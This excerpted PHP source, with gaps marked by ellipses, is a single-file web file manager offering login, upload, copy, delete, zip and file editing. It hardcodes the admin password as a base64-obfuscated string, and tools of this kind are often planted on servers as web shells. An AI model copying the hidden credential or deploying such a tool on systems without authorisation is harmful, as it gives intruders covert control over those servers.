...
$edit_files = true;
$default_timezone = 'Asia/Jakarta'; // UTC, Etc/UTC
...
$auth_users = ['admin' => password_hash(base64_decode('UmFoYXNpYUJvWlohIQ'), PASSWORD_DEFAULT)];
    ...
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        ...
        <div class="text-center">
            <form class="form-signin" action="" method="post" autocomplete="off">
                <h1 class="h3 mt-4 mb-3 font-weight-normal text-secondary">FM</h1>
                ...
                <div class="checkbox mb-3">
                    <label>
                        <input type="checkbox" value="remember-me"> <i class="text-secondary">Remember me</i>
                    </label>
                </div>
                <button class="btn btn-lg btn-dark btn-block mt-4" type="submit">Sign in</button>
            </form>
        </div>';
...
if (isset($_GET['upload']) && !FM_READONLY) {
    ...
    <div class="path">
        ...
        <p class="break-word">Destination folder: ' . fm_enc(fm_convert_win(FM_ROOT_PATH . "/" . FM_PATH)) . '</p>
        <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . "?p=" . fm_enc(FM_PATH) . '" class="dropzone" id="fileUploader" enctype="multipart/form-data">
...
if (isset($_POST['copy']) && !FM_READONLY) {
    ...
    echo '
            <p class="break-word">Files: <b>' . implode("</b>, <b>", $copy_files) . '</b></p>
            <p class="break-word">Source folder: ' . fm_enc(fm_convert_win(FM_ROOT_PATH . "/" . FM_PATH)) . '<br>
...
if (isset($_GET['copy']) && !isset($_GET['finish']) && !FM_READONLY) {
    ...
    if ($parent !== false) {
        echo '<li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>';
    }
    foreach ($folders as $f) {
        echo '<li><a href="?p=' . urlencode(trim(FM_PATH . "/" . $f, "/")) . '&amp;copy=' . urlencode($copy) . '"><i class="fa fa-folder-o"></i> ' . fm_convert_win($f) . '</a></li>';
    }
    echo '
        </ul>
    </div>';
            ...
            <div class="col-xs-12 col-sm-9">
                <ul class="list-inline footer-action">
                    ...
                    <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('Delete selected files and folders?')">
                        <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> Delete </a>
                    </li>
                    <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="Zip" onclick="return confirm('Create archive?')">
                        <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> Zip </a>
                    </li>
                    <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                        <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> Copy </a>
                    </li>
                </ul>
            </div>
        ...
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            ...
            <div class="col-xs-12 col-sm-4 text-right">
                <ul class="navbar-nav mr-auto float-right">
                    <?php if (!FM_READONLY) : ?>
                        <li class="nav-item">
                            <a title="Search" class="nav-link" href="javascript:showSearch('<?php echo urlencode(FM_PATH) ?>')"><i class="fa fa-search"></i> Search</a>
                        </li>
                        <li class="nav-item">
...
?>
    ...
    <head>
        ...
        <link rel="stylesheet" href="bs.min.css?v=1.4">
        <link rel="stylesheet" href="f.css?v=1.1">
    </head>
...
?>
    ...
    <head>
        ...
        <link rel="stylesheet" href="bs.min.css?v=1.4">
        <link rel="stylesheet" href="s.css?v=1.8">
